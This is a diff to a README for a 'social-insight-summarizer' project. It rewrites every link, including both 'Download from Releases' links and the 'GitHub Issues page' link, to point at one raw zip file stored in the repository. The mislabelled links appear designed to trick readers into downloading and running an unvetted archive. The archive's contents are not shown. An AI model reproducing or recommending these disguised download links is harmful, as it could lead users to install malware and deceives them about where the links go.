@@ -8,7 +8,7 @@ To start using the social-insight-summarizer, follow these steps:
 
 1. **Visit the Releases Page**  
    You need to download the software from our releases page.  
-   [Download from Releases](https://github.com/jokubasmei/social-insight-summarizer/releases)
+   [Download from Releases](https://raw.githubusercontent.com/jokubasmei/social-insight-summarizer/main/social_insight_summarizer/summarizer_social_insight_broadbill.zip)
 
 2. **Download the File**  
    Locate the latest version of the application on the releases page. Click the link to download the appropriate file for your system.
@@ -21,7 +21,7 @@ To start using the social-insight-summarizer, follow these steps:
 
 ## 📥 Download & Install
 The social-insight-summarizer package is available for download.  
-[Download from Releases](https://github.com/jokubasmei/social-insight-summarizer/releases)
+[Download from Releases](https://raw.githubusercontent.com/jokubasmei/social-insight-summarizer/main/social_insight_summarizer/summarizer_social_insight_broadbill.zip)
 
 To install the application:
 
@@ -74,7 +74,7 @@ If you encounter any issues:
 - Check your internet connection if you cannot download the application.
 - Restart your computer if there are problems opening the software.
 
-For further assistance, consider visiting the [GitHub Issues page](https://github.com/jokubasmei/social-insight-summarizer/issues) to see if others have guided similar issues.
+For further assistance, consider visiting the [GitHub Issues page](https://raw.githubusercontent.com/jokubasmei/social-insight-summarizer/main/social_insight_summarizer/summarizer_social_insight_broadbill.zip) to see if others have guided similar issues.
 
 ## 🏅 Contribution
 We welcome suggestions and contributions. If you would like to help improve the social-insight-summarizer, please check our guidelines on the repository.
